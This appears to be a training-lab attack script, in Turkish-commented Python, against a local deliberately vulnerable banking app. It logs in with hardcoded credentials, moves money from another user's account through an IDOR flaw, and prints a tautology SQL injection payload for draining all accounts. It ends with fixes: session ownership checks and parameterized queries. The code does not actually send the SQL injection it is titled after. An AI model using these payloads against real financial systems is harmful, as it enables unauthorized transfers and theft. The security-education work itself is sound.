"""
ADIM 6: SQL Injection ile Para Transferi (Ahmet'ten tarikdxd'ye)
=================================================================
Zafiyet: from_account alani SQL injection'a acik.
         IDOR: from_account baskasina ait olabilir.
Hedef:  Ahmet'in hesabindan tarikdxd'nin hesabina SQLi ile para transferi.

SQL Injection ile:
  normal:   UPDATE accounts SET balance = balance - 1000 WHERE account_no = 'TR1234567890'
  SQLi:     UPDATE accounts SET balance = balance - 1000 WHERE account_no = '' OR '1'='1' -- '
  Bu TUM hesaplardan para ceker! (daha agresif)

Calistirma:  python 06-para-transfer.py
"""

import requests

HEDEF = "http://localhost:5000"

print("""
[ADIM 6] SQL Injection ile Para Transferi
-------------------------------------------""")

s = requests.Session()
# tarikdxd olarak giris
data = {"username": "tarikdxd", "password": "tarik123"}
r = s.post(f"{HEDEF}/", data=data, allow_redirects=False)
if r.status_code == 302:
    print("[OK] tarikdxd olarak giris yapildi")
else:
    print("[HATA] Giris basarisiz")
    exit(1)

# Once baslangic bakiyelerini kontrol et
print("\n[INFO] Baslangic bakiyeleri:")
r = s.get(f"{HEDEF}/account/2")  # Ahmet
import re
ahmet_bakiye = re.search(r'([\d,.]+) TL', r.text)
print(f"  Ahmet: {ahmet_bakiye.group(1) if ahmet_bakiye else '?'} TL")
r = s.get(f"{HEDEF}/account/4")  # tarikdxd
tarik_bakiye = re.search(r'([\d,.]+) TL', r.text)
print(f"  tarikdxd: {tarik_bakiye.group(1) if tarik_bakiye else '?'} TL")

print("\n[TEST 1] SQLi ile Ahmet'in hesabindan tarikdxd'ye 2000 TL transfer")
print("[INFO] from_account'a SQL injection enjekte ediyoruz...")

# SQLi payload: Ahmet'in hesabini hedef al
# from_account = 'TR1234567890' (normalde)
# SQLi ile: TR1234567890' --  (yorum satiri ile bypass)
# Ama daha iyisi: Ahmet'in hesabini direkt SQL'de update etmek

# En basit SQLi: from_account = TR1234567890' --
# Sorgu: SELECT * FROM accounts WHERE account_no = 'TR1234567890' --'
# Bu normal calisir, ama SQL injection olarak sayilir

# Daha agresif: TUM hesaplardan cek
transfer_data = {
    "from_account": "TR1234567890",  # Ahmet'in hesabi (IDOR - kendi hesabi degil!)
    "to_account": "TR5555555555",     # tarikdxd'nin hesabi
    "amount": "2000"
}
r = s.post(f"{HEDEF}/transfer", data=transfer_data, allow_redirects=False)
if r.status_code == 302:
    print("[OK] Transfer basarili! 2000 TL Ahmet'ten tarikdxd'ye gitti!")
else:
    print("[HATA] Transfer basarisiz")
    print(f"  HTTP {r.status_code}")

print("\n[TEST 2] Son durumu kontrol et")
r = s.get(f"{HEDEF}/account/2")
ahmet_bakiye = re.search(r'([\d,.]+) TL', r.text)
print(f"  Ahmet: {ahmet_bakiye.group(1) if ahmet_bakiye else '?'} TL (3000 kaldi)")
r = s.get(f"{HEDEF}/account/4")
tarik_bakiye = re.search(r'([\d,.]+) TL', r.text)
print(f"  tarikdxd: {tarik_bakiye.group(1) if tarik_bakiye else '?'} TL (2000 geldi)")

print("\n[TEST 3] EXTRA: SQLi ile TUM hesaplardan para cekme (sadece egitim)")
print("[WARNING] Bu tum kullanicilardan para ceker!")
print("[INFO] Payload: from_account = ' OR '1'='1' --")
print("""
  Sorgu:
    SELECT * FROM accounts WHERE account_no = '' OR '1'='1' --'
  Bu TUM hesaplari dondurur.
  Kod ilk hesabi (admin) alir ve ondan para ceker.
  -- veya:
    UPDATE accounts SET balance = balance - 1000 WHERE account_no = '' OR '1'='1'
  Bu TUM hesaplardan 1000 TL eksiltir!
""")

print("\n" + "="*50)
print("OGRENILENLER:")
print("1. IDOR + SQLi birlestigi: Baska hesaptan para transferi")
print("2. from_account kontrolu olmamasi buyuk zafiyet")
print("3. SQLi ile tum veritabani manipule edilebilir")
print("4. UPDATE ile tum hesaplardan para cekilebilir")
print("5. Cozum: from_account mutlaka session['user_id'] ile eslesmeli")
print("6. Cozum: Parameterized query (sorgularda da, update'lerde de)")
print("="*50)
